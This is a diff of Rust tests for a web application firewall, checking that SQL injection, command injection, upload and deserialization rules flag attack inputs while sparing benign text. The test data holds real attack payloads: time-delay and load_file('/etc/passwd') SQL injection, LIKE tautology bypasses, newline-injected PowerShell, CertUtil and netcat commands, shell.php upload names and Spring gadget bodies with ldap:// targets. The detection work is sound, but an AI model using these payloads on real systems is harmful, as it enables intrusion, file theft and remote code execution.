@@ -205,6 +205,54 @@ async fn blind_time_delay_sqli_is_detected_in_query_and_body() {
     }
 }
 
+/// Unquoted time-delay probes are level 1 in bodies where no general-purpose
+/// language writes them: a later `ORDER BY` / `GROUP BY` item, a number that
+/// opens the value followed by an operator, and a form pair whose whole value
+/// is the call. Code assignments and calls stay clean.
+#[tokio::test]
+async fn unquoted_time_delay_shapes_are_level_one_in_bodies() {
+    let plugin = monitor_waf(1);
+    for body in [
+        br#"{"id":"1-sleep(5)"}"#.as_slice(),
+        br#"{"id":"1*sleep(5)"}"#,
+        br#"{"id":"1 ORDER BY 1,sleep(5)"}"#,
+        br#"{"id":"1 group by id, name, sleep(5)"}"#,
+    ] {
+        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
+    }
+    for body in [
+        b"id=sleep(5)".as_slice(),
+        b"a=1&id=sleep%285%29&b=2",
+        b"id=1-sleep(5)",
+        b"id=sleep(5)--+",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-010-B", Surface::Body(FORM, body)).await;
+    }
+
+    for body in [
+        br#"{"code":"x=sleep(5)"}"#.as_slice(),
+        br#"{"code":"total = 1 + sleep(5)"}"#,
+        br#"{"code":"rows = group_by(items, sleep(5))"}"#,
+        br#"{"note":"sort by name, sleep(8) hours"}"#,
+        br#"{"cell":"sleep(5)"}"#,
+    ] {
+        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(JSON, body)).await;
+    }
+    for body in [
+        b"x=sleep(5);\nprint(x)".as_slice(),
+        b"x = sleep(5)\nfoo();\nsleep(1);\ntime.sleep(1)",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-010-B", Surface::Body(TEXT, body)).await;
+    }
+    // A JSON string whose whole value is the call is claimed only at level 2.
+    assert_detected(
+        &monitor_waf(2),
+        "FE-SQLI-006-B",
+        Surface::Body(JSON, br#"{"cell":"sleep(5)"}"#),
+    )
+    .await;
+}
+
 #[tokio::test]
 async fn catalog_enumeration_and_error_based_sqli_are_detected() {
     let plugin = monitor_waf(1);
@@ -267,6 +315,37 @@ async fn catalog_enumeration_and_error_based_sqli_are_detected() {
     }
 }
 
+/// `load_file` also reads a MySQL `X'…'` hex literal, and SQL accepts an
+/// inline comment before the argument.
+#[tokio::test]
+async fn load_file_hex_literal_and_commented_argument_are_detected() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "q=union%20select%20load_file(X'2f6574632f706173737764')",
+        "q=union%20select%20load_file(/**/'/etc/passwd')",
+        "q=load_file(/*x*/0x2f6574632f706173737764)",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-008", Surface::Query(query)).await;
+    }
+    for body in [
+        b"1 union select load_file(x'2f6574632f706173737764')".as_slice(),
+        b"1 union select load_file(/**/'/etc/passwd')",
+        b"1 union select load_file( /* a */ 0x2f6574632f706173737764)",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
+    // Ordinary function and method names, with or without a comment.
+    for body in [
+        b"def load_file(path):\n    return open(path).read()\n".as_slice(),
+        b"data = load_file(xpath)",
+        b"data = load_file(/* default */ path)",
+        b"cfg = loader.load_file(/**/'/etc/app.conf')",
+        b"cfg = loader.load_file(X'2f65')",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-008-B", Surface::Body(TEXT, body)).await;
+    }
+}
+
 #[tokio::test]
 async fn quoted_string_tautology_is_detected_including_unspaced_form() {
     let plugin = monitor_waf(1);
@@ -297,6 +376,42 @@ async fn quoted_string_tautology_is_detected_including_unspaced_form() {
         Surface::Body(JSON, br#"{"op":"or","expr":"a=b"}"#),
     )
     .await;
+}
+
+/// `like` is an English word, so a `like` tautology needs an injection-shaped
+/// right operand: a wildcard, an unterminated string the application closes,
+/// or a trailing SQL comment. Quoted words in prose stay clean.
+#[tokio::test]
+async fn like_tautology_requires_an_injection_shaped_right_operand() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "user=x'%20or%20'a'%20like%20'a",
+        "user=x'%20or%20'a'%20like%20'%25",
+        "user=x'%20or%20'a'%20like%20'a'--%20",
+        "user=x'%20or%20'a'%20like%20'a'%23",
+    ] {
+        assert_detected(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
+    }
+    assert_detected(
+        &plugin,
+        "FE-SQLI-009-B",
+        Surface::Body(JSON, br#"{"user":"admin' or 'a' like 'a"}"#),
+    )
+    .await;
+
+    for query in [
+        "q='soda'%20or%20'pop'%20like%20'grandma'",
+        "q=%22soda%22%20or%20%22pop%22%20like%20%22grandma%22",
+        "q=Is%20it%20'soda'%20or%20'pop'%20like%20'grandma'%20says%3F",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-009", Surface::Query(query)).await;
+    }
+    for body in [
+        br#"{"text":"Is it 'soda' or 'pop' like 'grandma' says?"}"#.as_slice(),
+        b"Is it 'soda' or 'pop' like 'grandma' says?",
+    ] {
+        assert_clean(&plugin, "FE-SQLI-009-B", Surface::Body(TEXT, body)).await;
+    }
 }
 
 #[tokio::test]
@@ -502,6 +617,37 @@ async fn command_execution_without_a_classic_chain_is_detected() {
     let script: &[u8] = br#"{"entrypoint":"/bin/sh -c ./start.sh"}"#;
     assert_clean(&plugin, "FE-CMD-005-B", Surface::Body(JSON, script)).await;
     assert_detected(&monitor_waf(2), "FE-CMD-005-B", Surface::Body(JSON, script)).await;
+}
+
+/// After a CR/LF, a capitalised Windows tool name without a flag starts a
+/// prose line, and a spaced `&` (raw or as `&amp;`) is prose, not a shell
+/// operator.
+#[tokio::test]
+async fn newline_command_ignores_capitalised_prose_and_spaced_ampersand() {
+    let plugin = monitor_waf(1);
+    for query in [
+        "host=127.0.0.1%0APowerShell%20-nop%20-c%20x",
+        "host=127.0.0.1%0ACertUtil%20/urlcache",
+        "host=127.0.0.1%0Apowershell%20IEX(x)",
+        "host=127.0.0.1%0APOWERSHELL",
+        "host=127.0.0.1%0Acat%26%26id",
+        "host=127.0.0.1%0Acat%20%26%26%20id",
+        "host=127.0.0.1%0Aid%20|%20nc%20h%204444",
+        "host=127.0.0.1%0Acat%20%3E%20/tmp/x",
+    ] {
+        assert_detected(&plugin, "FE-CMD-004", Surface::Query(query)).await;
+    }
+    for query in [
+        "note=Tools%0APowerShell%20is%20great",
+        "note=Skills:%0APowerShell%0APython",
+        "note=Books:%0APowerShell%20-%20a%20primer",
+        "note=pets%0Acat%20%26amp;%20dog",
+        "note=pets%0Acat%20%26%20dog",
+        "note=pets%0Acat%20%26lt;%20dog",
+        "note=pets%0Acat%20%3E%20dog",
+    ] {
+        assert_clean(&plugin, "FE-CMD-004", Surface::Query(query)).await;
+    }
 }
 
 #[tokio::test]
@@ -835,6 +981,51 @@ async fn executable_upload_filename_requires_multipart_inspection() {
     .await;
 }
 
+/// An RFC 8187 `filename*` value may name any charset and a language tag, and
+/// percent-encode the name.
+#[tokio::test]
+async fn upload_filename_star_accepts_any_charset_and_language_tag() {
+    let inspecting = Waf::new(&json!({
+        "mode": "monitor",
+        "inspect_multipart": true,
+        "scan_budget_ms": 0
+    }))
+    .unwrap();
+    let multipart = "multipart/form-data; boundary=b";
+    for filename in [
+        "filename*=UTF-8'en'shell.php",
+        "filename*=ISO-8859-1''shell.php",
+        "filename*=utf-8''shell%2Ephp",
+        "filename*=ISO-8859-1'de'shell.p%68p",
+        "filename*=UTF-8'en-us'shell%2Ephp%2Ejpg",
+    ] {
+        let part = format!(
+            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
+        );
+        assert_detected(
+            &inspecting,
+            "FE-UPLOAD-001",
+            Surface::Body(multipart, part.as_bytes()),
+        )
+        .await;
+    }
+    for filename in [
+        "filename*=UTF-8'en'report.pdf",
+        "filename*=ISO-8859-1''notes%2Etxt",
+        "filename*=UTF-8'en'php-guide.pdf",
+    ] {
+        let part = format!(
+            "--b\r\nContent-Disposition: form-data; name=\"f\"; {filename}\r\n\r\nx\r\n--b--\r\n"
+        );
+        assert_clean(
+            &inspecting,
+            "FE-UPLOAD-001",
+            Surface::Body(multipart, part.as_bytes()),
+        )
+        .await;
+    }
+}
+
 #[tokio::test]
 async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
     let plugin = monitor_waf(1);
@@ -887,6 +1078,49 @@ async fn deserialization_gadgets_are_detected_without_flagging_json_ld() {
         Surface::Body(TEXT, b"key: !!str value\nblob: !!binary aGk="),
     )
     .await;
+}
+
+/// Spring is matched by its gadget packages, so Spring Session / Spring
+/// Security JSON — discriminated or `WRAPPER_ARRAY` typed — is not a gadget.
+#[tokio::test]
+async fn spring_session_json_is_not_a_polymorphic_gadget() {
+    let plugin = monitor_waf(1);
+    for body in [
+        br#"{"@class":"org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName":"ldap://x/a","propertyPath":"x"}"#.as_slice(),
+        br#"["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"ldap://x/a"}]"#,
+        br#"["org.springframework.transaction.jta.JtaTransactionManager",{"userTransactionName":"ldap://x/a"}]"#,
+    ] {
+        assert_detected(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
+    }
+
+    // A Spring Session security context as its Jackson serializer writes it:
+    // discriminated Spring Security types, `java.util` collection wrappers,
+    // and a `java.lang.Long` scalar wrapper.
+    let spring_session = concat!(
+        r#"{"@class":"org.springframework.security.core.context.SecurityContextImpl","#,
+        r#""authentication":{"@class":"#,
+        r#""org.springframework.security.authentication.UsernamePasswordAuthenticationToken","#,
+        r#""authorities":["java.util.Collections$UnmodifiableRandomAccessList",[{"#,
+        r#""@class":"org.springframework.security.core.authority.SimpleGrantedAuthority","#,
+        r#""authority":"ROLE_USER"}]],"details":{"#,
+        r#""@class":"org.springframework.security.web.authentication.WebAuthenticationDetails","#,
+        r#""remoteAddress":"203.0.113.10","sessionId":null},"authenticated":true,"#,
+        r#""principal":{"@class":"org.springframework.security.core.userdetails.User","#,
+        r#""username":"alice","enabled":true},"credentials":null},"#,
+        r#""creationTime":["java.lang.Long",1700000000000]}"#,
+    );
+    assert_clean(
+        &plugin,
+        "FE-DESER-005",
+        Surface::Body(JSON, spring_session.as_bytes()),
+    )
+    .await;
+    for body in [
+        br#"["org.springframework.security.core.authority.SimpleGrantedAuthority",{"authority":"ROLE_USER"}]"#.as_slice(),
+        br#"{"@class":"org.springframework.session.MapSession","id":"5f1c","maxInactiveInterval":1800}"#,
+    ] {
+        assert_clean(&plugin, "FE-DESER-005", Surface::Body(JSON, body)).await;
+    }
 }
 
 #[tokio::test]
